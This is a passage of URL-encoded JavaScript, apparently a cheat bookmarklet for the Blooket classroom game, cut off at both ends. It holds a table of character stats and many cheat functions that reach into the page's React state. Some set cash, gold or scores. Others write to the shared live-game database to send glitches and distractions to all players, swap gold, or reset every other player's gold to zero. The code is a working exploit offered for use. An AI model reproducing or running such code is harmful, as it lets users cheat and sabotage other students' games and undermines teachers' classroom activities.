:%5B400,6500,76e3,87e4%5D%7D,%7Bname:%22Baby%20Penguin%22,color:%22#414042%22,class:%22%E2%9D%84%EF%B8%8F%22,rarity:%22Common%22,cash:%5B3,8,70,450,2700%5D,time:%5B1,1,1,1,1%5D,price:%5B420,3300,33e3,23e4%5D%7D,%7Bname:%22Polar%20Bear%22,color:%22#7ca1d5%22,class:%22%E2%9D%84%EF%B8%8F%22,rarity:%22Common%22,cash:%5B12,75,700,6500,85e3%5D,time:%5B8,7,6,5,5%5D,price:%5B630,7e3,91e3,14e5%5D%7D,%7Bname:%22Walrus%22,color:%22#7d4f33%22,class:%22%E2%9D%84%EF%B8%8F%22,rarity:%22Common%22,cash:%5B11,46,420,3700,51e3%5D,time:%5B5,5,4,4,4%5D,price:%5B550,6200,68e3,1e6%5D%7D,%7Bname:%22Tiger%22,color:%22#f18221%22,class:%22%F0%9F%8C%B4%22,rarity:%22Common%22,cash:%5B6,20,100,975,7500%5D,time:%5B3,3,1,1,1%5D,price:%5B390,6e3,7e4,61e4%5D%7D,%7Bname:%22Jaguar%22,color:%22#fbb040%22,class:%22%F0%9F%8C%B4%22,rarity:%22Common%22,cash:%5B8,28,230,1600,17e3%5D,time:%5B3,3,2,2,2%5D,price:%5B390,6e3,7e4,61e4%5D%7D,%7Bname:%22Toucan%22,color:%22#ffca34%22,class:%22%F0%9F%8C%B4%22,rarity:%22Common%22,cash:%5B9,20,175,625,3800%5D,time:%5B2,2,2,1,1%5D,price:%5B520,4800,42e3,3e5%5D%7D,%7Bname:%22Cockatoo%22,color:%22#7ca1d5%22,class:%22%F0%9F%8C%B4%22,rarity:%22Common%22,cash:%5B6,35,160,1700,18e3%5D,time:%5B4,4,2,2,2%5D,price:%5B500,5e3,63e3,7e5%5D%7D,%7Bname:%22Macaw%22,color:%22#00aeef%22,class:%22%F0%9F%8C%B4%22,rarity:%22Common%22,cash:%5B3,8,85,850,8500%5D,time:%5B1,1,1,1,1%5D,price:%5B480,5400,62e3,63e4%5D%7D,%7Bname:%22Parrot%22,color:%22#ed1c24%22,class:%22%F0%9F%8C%B4%22,rarity:%22Common%22,cash:%5B3,9,90,900,9e3%5D,time:%5B1,1,1,1,1%5D,price:%5B540,5700,65e3,69e4%5D%7D,%7Bname:%22Panther%22,color:%22#2f2c38%22,class:%22%F0%9F%8C%B4%22,rarity:%22Common%22,cash:%5B12,28,215,2100,21e3%5D,time:%5B5,3,2,2,2%5D,price:%5B530,6500,76e3,87e4%5D%7D,%7Bname:%22Anaconda%22,color:%22#8a9143%22,class:%22%F0%9F%8C%B4%22,rarity:%22Common%22,cash:%5B3,15,85,1500,7600%5D,time:%5B1,2,1,2,1%5D,price:%5B410,5100,58e3,59e4%5D%7D,%7Bname:%22Orangutan%22,color:%22#bc6234%22,class:%22%F0%9F%8C%B4%22,rarity:%22Common%22,cash:%5B13,52,570,4300,7e4%5D,time:%5B5,5,5,4,4%5D,price:%5B600,7e3,8e4,14e5%5D%7D,%7Bname:%22Capuchin%22,color:%22#e0b0a6%22,class:%22%F0%9F%8C%B4%22,rarity:%22Common%22,cash:%5B4,14,160,780,8200%5D,time:%5B2,2,2,1,1%5D,price:%5B390,4700,57e3,68e4%5D%7D,%7Bname:%22Elf%22,color:%22#a7d054%22,class:%22%E2%9A%94%EF%B8%8F%22,rarity:%22Uncommon%22,cash:%5B5e3,15e3,15e4,15e5,1e7%5D,time:%5B1,1,1,1,1%5D,price:%5B8e5,9e6,11e7,8e8%5D%7D,%7Bname:%22Witch%22,color:%22#4ab96d%22,class:%22%E2%9A%94%EF%B8%8F%22,rarity:%22Uncommon%22,cash:%5B18e3,6e4,4e4,4e6,35e6%5D,time:%5B3,3,2,2,2%5D,price:%5B11e5,12e6,15e7,14e8%5D%7D,%7Bname:%22Wizard%22,color:%22#5a459c%22,class:%22%E2%9A%94%EF%B8%8F%22,rarity:%22Uncommon%22,cash:%5B19500,65e3,44e4,46e5,4e6%5D,time:%5B3,3,2,2,2%5D,price:%5B13e5,135e5,16e7,16e8%5D%7D,%7Bname:%22Fairy%22,color:%22#df6d9c%22,class:%22%E2%9A%94%EF%B8%8F%22,rarity:%22Uncommon%22,cash:%5B18500,6e4,62e4,44e5,38e6%5D,time:%5B3,3,3,2,2%5D,price:%5B12e5,125e5,15e6,15e8%5D%7D,%7Bname:%22Slime%20Monster%22,color:%22#2fa04a%22,class:%22%E2%9A%94%EF%B8%8F%22,rarity:%22Uncommon%22,cash:%5B35e3,14e4,1e6,11e6,11e7%5D,time:%5B5,5,4,4,4%5D,price:%5B16e5,15e6,2e8,23e8%5D%7D,%7Bname:%22Jester%22,color:%22#be1e2d%22,class:%22%E2%9A%94%EF%B8%8F%22,rarity:%22Rare%22,cash:%5B25e3,1e5,68e4,65e5,32e6%5D,time:%5B3,3,2,2,1%5D,price:%5B2e6,21e6,23e7,26e8%5D%7D,%7Bname:%22Dragon%22,color:%22#2fa04a%22,class:%22%E2%9A%94%EF%B8%8F%22,rarity:%22Rare%22,cash:%5B36e3,15e4,15e5,15e6,15e7%5D,time:%5B4,4,4,4,4%5D,price:%5B23e5,24e6,27e7,3e9%5D%7D,%7Bname:%22Unicorn%22,color:%22#f6afce%22,class:%22%E2%9A%94%EF%B8%8F%22,rarity:%22Epic%22,cash:%5B24e3,15e4,14e5,7e6,75e6%5D,time:%5B2,2,2,1,1%5D,price:%5B45e5,45e6,55e7,65e8%5D%7D,%7Bname:%22Queen%22,color:%22#9e1f63%22,class:%22%E2%9A%94%EF%B8%8F%22,rarity:%22Rare%22,cash:%5B24e3,95e3,95e4,97e5,95e6%5D,time:%5B3,3,3,3,3%5D,price:%5B19e5,2e7,23e7,25e8%5D%7D,%7Bname:%22King%22,color:%22#ee2640%22,class:%22%E2%9A%94%EF%B8%8F%22,rarity:%22Legendary%22,cash:%5B75e3,4e5,6e6,9e7,125e7%5D,time:%5B5,5,5,5,5%5D,price:%5B6e6,95e6,16e8,25e9%5D%7D,%7Bname:%22Two%20of%20Spades%22,color:%22#414042%22,class:%22%F0%9F%8F%B0%22,rarity:%22Uncommon%22,cash:%5B4500,14e3,14e4,14e5,9e6%5D,time:%5B1,1,1,1,1%5D,price:%5B77e4,83e5,98e6,71e7%5D%7D,%7Bname:%22Eat%20Me%22,color:%22#d58c55%22,class:%22%F0%9F%8F%B0%22,rarity:%22Uncommon%22,cash:%5B13e3,45e3,45e4,45e5,5e7%5D,time:%5B2,2,2,2,2%5D,price:%5B13e5,14e6,16e7,2e9%5D%7D,%7Bname:%22Drink%20Me%22,color:%22#dd7399%22,class:%22%F0%9F%8F%B0%22,rarity:%22Uncommon%22,cash:%5B12e3,4e4,4e5,4e6,45e6%5D,time:%5B2,2,2,2,2%5D,price:%5B12e5,12e6,14e7,18e8%5D%7D,%7Bname:%22Alice%22,color:%22#4cc9f5%22,class:%22%F0%9F%8F%B0%22,rarity:%22Uncommon%22,cash:%5B13e3,42e3,21e4,21e5,23e6%5D,time:%5B2,2,1,1,1%5D,price:%5B12e5,13e6,15e7,19e8%5D%7D,%7Bname:%22Queen%20of%20Hearts%22,color:%22#d62027%22,class:%22%F0%9F%8F%B0%22,rarity:%22Uncommon%22,cash:%5B23e3,87e3,62e4,75e5,9e7%5D,time:%5B4,4,3,3,3%5D,price:%5B13e5,13e6,18e7,24e8%5D%7D,%7Bname:%22Dormouse%22,color:%22#89d6f8%22,class:%22%F0%9F%8F%B0%22,rarity:%22Rare%22,cash:%5B17e3,68e3,7e5,35e5,35e6%5D,time:%5B2,2,1,1,1%5D,price:%5B2e6,22e6,25e7,28e8%5D%7D,%7Bname:%22White%20Rabbit%22,color:%22#ffcd05%22,class:%22%F0%9F%8F%B0%22,rarity:%22Rare%22,cash:%5B26e3,105e3,11e6,77e5,72e6%5D,time:%5B3,3,3,2,2%5D,price:%5B2e6,23e6,28e7,29e8%5D%7D,%7Bname:%22Cheshire%20Cat%22,color:%22#dd7399%22,class:%22%F0%9F%8F%B0%22,rarity:%22Rare%22,cash:%5B32e3,1e5,9e5,9e6,6e7%5D,time:%5B4,3,3,3,2%5D,price:%5B18e5,19e6,22e7,24e8%5D%7D,%7Bname:%22Caterpillar%22,color:%22#00c0f3%22,class:%22%F0%9F%8F%B0%22,rarity:%22Epic%22,cash:%5B1e4,7e4,65e4,75e5,85e6%5D,time:%5B1,1,1,1,1%5D,price:%5B42e5,42e6,54e7,69e8%5D%7D,%7Bname:%22Mad%20Hatter%22,color:%22#914f93%22,class:%22%F0%9F%8F%B0%22,rarity:%22Epic%22,cash:%5B38e3,25e4,15e5,14e6,8e7%5D,time:%5B3,3,2,2,1%5D,price:%5B48e5,48e6,52e7,66e8%5D%7D,%7Bname:%22King%20of%20Hearts%22,color:%22#c62127%22,class:%22%F0%9F%8F%B0%22,rarity:%22Legendary%22,cash:%5B8e4,42e4,68e5,1e8,15e8%5D,time:%5B5,5,5,5,5%5D,price:%5B7e6,11e7,18e8,3e10%5D%7D,%7Bname:%22Earth%22,color:%22#416eb5%22,class:%22%F0%9F%9A%80%22,rarity:%22Uncommon%22,cash:%5B15e3,45e3,6e5,65e5,65e6%5D,time:%5B3,3,3,3,3%5D,price:%5B1e6,11e6,15e7,17e8%5D%7D,%7Bname:%22Meteor%22,color:%22#c68c3c%22,class:%22%F0%9F%9A%80%22,rarity:%22Uncommon%22,cash:%5B23e3,65e3,7e5,45e5,2e7%5D,time:%5B5,4,3,2,1%5D,price:%5B95e4,13e6,16e7,16e8%5D%7D,%7Bname:%22Stars%22,color:%22#19184d%22,class:%22%F0%9F%9A%80%22,rarity:%22Uncommon%22,cash:%5B1e4,4e4,2e5,2e6,18e6%5D,time:%5B2,2,1,1,1%5D,price:%5B14e5,14e6,15e7,15e8%5D%7D,%7Bname:%22Alien%22,color:%22#8dc63f%22,class:%22%F0%9F%9A%80%22,rarity:%22Uncommon%22,cash:%5B3e4,1e5,1e6,11e6,85e6%5D,time:%5B4,4,4,4,4%5D,price:%5B15e5,17e6,19e7,17e8%5D%7D,%7Bname:%22Planet%22,color:%22#9dc6ea%22,class:%22%F0%9F%9A%80%22,rarity:%22Rare%22,cash:%5B25e3,1e5,9e5,9e6,9e7%5D,time:%5B3,3,3,3,3%5D,price:%5B2e6,21e6,21e7,24e8%5D%7D,%7Bname:%22UFO%22,color:%22#a15095%22,class:%22%F0%9F%9A%80%22,rarity:%22Rare%22,cash:%5B17e3,7e4,7e5,7e6,7e7%5D,time:%5B2,2,2,2,2%5D,price:%5B21e5,23e6,25e7,28e8%5D%7D,%7Bname:%22Spaceship%22,color:%22#ffcb29%22,class:%22%F0%9F%9A%80%22,rarity:%22Epic%22,cash:%5B6e4,32e4,21e5,15e6,85e6%5D,time:%5B5,4,3,2,1%5D,price:%5B48e5,46e6,54e7,68e8%5D%7D,%7Bname:%22Astronaut%22,color:%22#9bd4ee%22,class:%22%F0%9F%9A%80%22,rarity:%22Legendary%22,cash:%5B45e3,26e4,25e5,38e6,55e7%5D,time:%5B3,3,2,2,2%5D,price:%5B65e5,1e8,17e8,27e9%5D%7D,%7Bname:%22Lil%20Bot%22,color:%22#3e564a%22,class:%22%F0%9F%A4%96%22,rarity:%22Uncommon%22,cash:%5B4e3,12e3,18e4,19e5,25e6%5D,time:%5B1,1,1,1,1%5D,price:%5B73e4,12e6,13e7,19e8%5D%7D,%7Bname:%22Lovely%20Bot%22,color:%22#f179af%22,class:%22%F0%9F%A4%96%22,rarity:%22Uncommon%22,cash:%5B16e3,65e3,65e4,48e5,42e6%5D,time:%5B3,3,3,2,2%5D,price:%5B13e5,14e6,17e7,16e8%5D%7D,%7Bname:%22Angry%20Bot%22,color:%22#f1613a%22,class:%22%F0%9F%A4%96%22,rarity:%22Uncommon%22,cash:%5B22e3,85e3,8e5,62e5,65e6%5D,time:%5B4,4,4,3,3%5D,price:%5B12e5,13e6,15e7,17e8%5D%7D,%7Bname:%22Happy%20Bot%22,color:%22#51ba6b%22,class:%22%F0%9F%A4%96%22,rarity:%22Uncommon%22,cash:%5B11e3,45e3,5e5,25e5,3e7%5D,time:%5B2,2,2,1,1%5D,price:%5B14e5,15e6,18e7,24e8%5D%7D,%7Bname:%22Watson%22,color:%22#d69b5a%22,class:%22%F0%9F%A4%96%22,rarity:%22Rare%22,cash:%5B24e3,1e5,1e6,1e7,1e8%5D,time:%5B3,3,3,3,3%5D,price:%5B2e6,22e6,24e7,26e8%5D%7D,%7Bname:%22Buddy%20Bot%22,color:%22#9dc6ea%22,class:%22%F0%9F%A4%96%22,rarity:%22Rare%22,cash:%5B22e3,95e3,65e4,65e5,65e6%5D,time:%5B3,3,2,2,2%5D,price:%5B19e5,21e6,23e7,25e8%5D%7D,%7Bname:%22Brainy%20Bot%22,color:%22#9ecf7a%22,class:%22%F0%9F%A4%96%22,rarity:%22Epic%22,cash:%5B5e4,25e4,21e5,21e6,17e7%5D,time:%5B4,3,3,3,2%5D,price:%5B5e6,46e6,5e8,67e8%5D%7D,%7Bname:%22Mega%20Bot%22,color:%22#d71f27%22,class:%22%F0%9F%A4%96%22,rarity:%22Legendary%22,cash:%5B8e4,43e4,42e5,62e6,1e9%5D,time:%5B5,5,3,3,3%5D,price:%5B7e6,12e7,19e8,35e9%5D%7D%5D.map(e=%3E(%7Bname:e.name,value:JSON.stringify(e)%7D)))%7D%5D,run:function(e)%7Bvar%20t=document.createElement(%22iframe%22),t=(document.body.append(t),window.alert=t.contentWindow.alert.bind(window),t.remove(),Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner)%5B%22stateNode%22%5D;10%3C=t.state.blooks.length&&alert(%22Choose%20a%20blook%20to%20replace%22),t.chooseBlook(JSON.parse(e))%7D%7D,%7Bname:%22Free%20Upgrades%22,description:%22Sets%20upgrade%20prices%20to%200%20for%20all%20current%20blooks%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.setState(e=%3E(%7B...e,blooks:e.blooks.map(e=%3E(%7B...e,price:%5B0,0,0,0%5D%7D))%7D))%7D%7D,%7Bname:%22Max%20Blooks%22,description:%22Maxes%20out%20all%20your%20blooks'%20levels%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state.blooks.forEach(e=%3Ee.level=4)%7D%7D,%7Bname:%22Remove%20Glitches%22,description:%22Removes%20all%20enemy%20glitches%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.setState(%7Bbits:0,ads:%5B%5D,hazards:%5B%5D,color:%22%22,lol:!1,joke:!1,slow:!1,dance:!1,glitch:%22%22,glitcherName:%22%22,glitcherBlook:%22%22%7D),clearTimeout(e.adTimeout),clearInterval(e.hazardInterval),clearTimeout(e.nightTimeout),clearTimeout(e.glitchTimeout),clearTimeout(e.lolTimeout),clearTimeout(e.jokeTimeout),clearTimeout(e.slowTimeout),clearTimeout(e.danceTimeout),clearTimeout(e.nameTimeout)%7D%7D,%7Bname:%22Send%20Glitch%22,description:%22Sends%20a%20glitch%20to%20everyone%20else%20playing%22,inputs:%5B%7Bname:%22Glitch%22,type:%22options%22,options:Object.entries(%7Blb:%22Lunch%20Break%22,as:%22Ad%20Spam%22,e37:%22Error%2037%22,nt:%22Night%20Time%22,lo:%22#LOL%22,j:%22Jokester%22,sm:%22Slow%20Mo%22,dp:%22Dance%20Party%22,v:%22Vortex%22,r:%22Reverse%22,f:%22Flip%22,m:%22Micro%22%7D).map((%5Be,t%5D)=%3E(%7Bname:t,value:e%7D))%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.safe=!0,t.props.liveGameController.setVal(%7Bpath:%60c/$%7Bt.props.client.name%7D/tat%60,val:e%7D)%7D%7D,%7Bname:%22Set%20All%20MegaBot%22,description:%22Sets%20all%20your%20blooks%20to%20maxed%20out%20Mega%20Bots%22,run:function()%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bblooks:new%20Array(10).fill(%7Bname:%22Mega%20Bot%22,color:%22#d71f27%22,class:%22%F0%9F%A4%96%22,rarity:%22Legendary%22,cash:%5B8e4,43e4,42e5,62e6,1e9%5D,time:%5B5,5,3,3,3%5D,price:%5B7e6,12e7,19e8,35e9%5D,active:!1,level:4,bonus:5.5%7D)%7D)%7D%7D,%7Bname:%22Set%20Cash%22,description:%22Sets%20amount%20of%20cash%20you%20have%22,inputs:%5B%7Bname:%22Cash%22,type:%22number%22%7D%5D,run:function(e)%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bcash:e%7D)%7D%7D%5D,fishing:%5B%7Bname:%22Frenzy%22,description:%22Sets%20everyone%20to%20frenzy%20mode%22,run:function()%7Bvar%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;e.props.liveGameController.setVal(%7Bpath:%22c/%22+e.props.client.name,val:%7Bb:e.props.client.blook,w:e.state.weight,f:%22Frenzy%22,s:!0%7D%7D)%7D%7D,%7Bname:%22Remove%20Distractions%22,description:%22Removes%20distractions%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(()=%3E%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bparty:%22%22%7D)%7D,50))%7D%7D,%7Bname:%22Send%20Distraction%22,description:%22Sends%20a%20distraction%20to%20everyone%22,inputs:%5B%7Bname:%22Distraction%22,type:%22options%22,options:%5B%22Crab%22,%22Jellyfish%22,%22Frog%22,%22Pufferfish%22,%22Octopus%22,%22Narwhal%22,%22Megalodon%22,%22Blobfish%22,%22Baby%20Shark%22%5D%7D%5D,run:function(e)%7Bvar%20t=document.createElement(%22iframe%22),t=(document.body.append(t),window.alert=t.contentWindow.alert.bind(window),t.remove(),Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner)%5B%22stateNode%22%5D;t.safe=!0,t.props.liveGameController.setVal(%7Bpath:%22c/%22+t.props.client.name,val:%7Bb:t.props.client.blook,w:t.state.weight,f:e,s:!0%7D%7D)%7D%7D,%7Bname:%22Set%20Lure%22,description:%22Sets%20fishing%20lure%20(range%201%20-%205)%22,inputs:%5B%7Bname:%22Lure%20(1%20-%205)%22,type:%22number%22,min:1,max:5%7D%5D,run:function(e)%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Blure:Math.max(Math.min(e-1,4),0)%7D)%7D%7D,%7Bname:%22Set%20Weight%22,description:%22Sets%20weight%22,inputs:%5B%7Bname:%22Weight%22,type:%22number%22%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.setState(%7Bweight:e,weight2:e%7D),t.props.liveGameController.setVal(%7Bpath:%22c/%22+t.props.client.name,val:%7Bb:t.props.client.blook,w:e,f:%5B%22Crab%22,%22Jellyfish%22,%22Frog%22,%22Pufferfish%22,%22Octopus%22,%22Narwhal%22,%22Megalodon%22,%22Blobfish%22,%22Baby%20Shark%22%5D%5BMath.floor(9*Math.random())%5D%7D%7D)%7D%7D%5D,flappy:%5B%7Bname:%22Toggle%20Ghost%22,description:%22Lets%20you%20go%20through%20the%20pipes%22,type:%22toggle%22,enabled:!1,run:function()%7Bthis.enabled=!this.enabled,Object.values(document.querySelector(%22#phaser-bouncy%22))%5B1%5D.children%5B0%5D._owner.stateNode.state.game.scene.physics.world.bodies.entries.forEach(e=%3Ee.gameObject.frame.texture.key.startsWith(%22blook%22)&&(e.checkCollision.none=this.enabled,e.gameObject.setAlpha(this.enabled?.5:1)))%7D%7D,%7Bname:%22Set%20Score%22,description:%22Sets%20flappy%20blook%20score%22,inputs:%5B%7Bname:%22Score%22,type:%22number%22%7D%5D,run:function(e)%7BObject.values(document.querySelector(%22#phaser-bouncy%22))%5B1%5D.children%5B0%5D._owner.stateNode.setState(%7Bscore:e%7D)%7D%7D%5D,gold:%5B%7Bname:%22Always%20Triple%22,description:%22Always%20get%20triple%20gold%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Blet%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t._choosePrize%7C%7C=t.choosePrize,this.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null,t.choosePrize=t._choosePrize%7C%7Ct.choosePrize):(this.enabled=!0,this.data=setInterval(()=%3E%7Bt.choosePrize=function(e)%7Bt.state.choices%5Be%5D=%7Btype:%22multiply%22,val:3,text:%22Triple%20Gold!%22,blook:%22Unicorn%22%7D,t._choosePrize(e)%7D%7D,50))%7D%7D,%7Bname:%22Auto%20Choose%22,description:%22Automatically%20picks%20the%20option%20that%20would%20give%20you%20the%20most%20gold%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(async()=%3E%7Btry%7Blet%20a=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;if(%22prize%22===a.state.stage)%7Bvar%20r=Object.entries(await%20new%20Promise(t=%3Ea.props.liveGameController.getDatabaseVal(%22c%22,e=%3Ee&&t(e)))%7C%7C%5B%5D).filter(e=%3Ee%5B0%5D!=a.props.client.name).sort((e,t)=%3Et%5B1%5D.g-e%5B1%5D.g)%5B0%5D?.%5B1%5D?.g%7C%7C0;let%20o=0;index=-1;for(let%20t=0;t%3Ca.state.choices.length;t++)%7Bvar%7Btype:n,val:i%7D=a.state.choices%5Bt%5D;let%20e=a.state.gold;switch(n)%7Bcase%22gold%22:e=a.state.gold+i%7C%7Ca.state.gold;break;case%22multiply%22:case%22divide%22:e=Math.round(a.state.gold*i)%7C%7Ca.state.gold;break;case%22swap%22:e=r%7C%7Ca.state.gold;case%22take%22:e=a.state.gold+r*i%7C%7Ca.state.gold%7D(e%7C%7C0)%3C=o%7C%7C(o=e,index=t+1)%7Ddocument.querySelector(%60div%5Bclass%5E='styles__choice$%7Bindex%7D'%5D%60).click()%7D%7Dcatch%7B%7D%7D,50))%7D%7D,%7Bname:%22Chest%20ESP%22,description:%22Shows%20what%20each%20chest%20will%20give%20you%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(()=%3E%7BObject.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner.stateNode.state.choices.forEach((%7Btext:e%7D,t)=%3E%7Bvar%20o,t=document.querySelector(%60div%5Bclass%5E='styles__choice$%7Bt+1%7D'%5D%60);t&&!t.querySelector(%22div%22)&&((o=document.createElement(%22div%22)).style.color=%22white%22,o.style.fontFamily=%22Eczar%22,o.style.fontSize=%222em%22,o.style.display=%22flex%22,o.style.justifyContent=%22center%22,o.style.transform=%22translateY(200px)%22,o.innerText=e,t.append(o))%7D)%7D,50))%7D%7D,%7Bname:%22Reset%20Players%20Gold%22,description:%22Sets%20a%20player's%20gold%20to%200%22,inputs:%5B%7Bname:%22Player%22,type:%22options%22,options:()=%3E%7Blet%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;return%20new%20Promise(t=%3Ee.props.liveGameController._liveApp?e.props.liveGameController.getDatabaseVal(%22c%22,e=%3Ee&&t(Object.keys(e))):t(%5B%5D))%7D%7D%5D,run:function(e)%7Bvar%7Bprops:t,state:o%7D=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.liveGameController.setVal(%7Bpath:%22c/%22.concat(t.client.name),val:%7Bb:t.client.blook,g:o.gold,tat:e+%22:swap:0%22%7D%7D)%7D%7D,%7Bname:%22Set%20Gold%22,description:%22Sets%20amount%20of%20gold%22,inputs:%5B%7Bname:%22Gold%22,type:%22number%22%7D%5D,run:function(e)%7Bvar%20t=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;t.setState(%7Bgold:e,gold2:e%7D),t.props.liveGameController.setVal(%7Bpath:%22c/%22.concat(t.props.client.name),val:%7Bb:t.props.client.blook,g:e%7D%7D)%7D%7D,%7Bname:%22Swap%20Gold%22,description:%22Swaps%20gold%20with%20someone%22,inputs:%5B%7Bname:%22Player%22,type:%22options%22,options:()=%3E%7Blet%20e=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;return%20new%20Promise(t=%3Ee.props.liveGameController._liveApp?e.props.liveGameController.getDatabaseVal(%22c%22,e=%3Ee&&t(Object.keys(e))):t(%5B%5D))%7D%7D%5D,run:function(t)%7Blet%20o=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;o.props.liveGameController.getDatabaseVal(%22c%22,e=%3E%7Be?.%5Bt%5D&&(e=e%5Bt%5D%5B%22g%22%5D,o.props.liveGameController.setVal(%7Bpath:%22c/%22.concat(o.props.client.name),val:%7Bb:o.props.client.blook,g:e,tat:t+%22:swap:%22+o.state.gold%7D%7D),o.setState(%7Bgold:e,gold2:e%7D))%7D)%7D%7D,%7Bname:%22Reset%20All%20Players'%20Gold%22,description:%22Set's%20everyone%20else's%20gold%20to%200%22,run:function()%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.alert=e.contentWindow.alert.bind(window),e.remove();let%7Bprops:o,state:a%7D=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D,r=0;o.liveGameController.getDatabaseVal(%22c%22,async%20e=%3E%7Bif(e)for(const%20t%20of%20Object.keys(e))o.liveGameController.setVal(%7Bpath:%22c/%22.concat(o.client.name),val:%7Bb:o.client.blook,g:a.gold,tat:t+%22:swap:0%22%7D%7D),r++,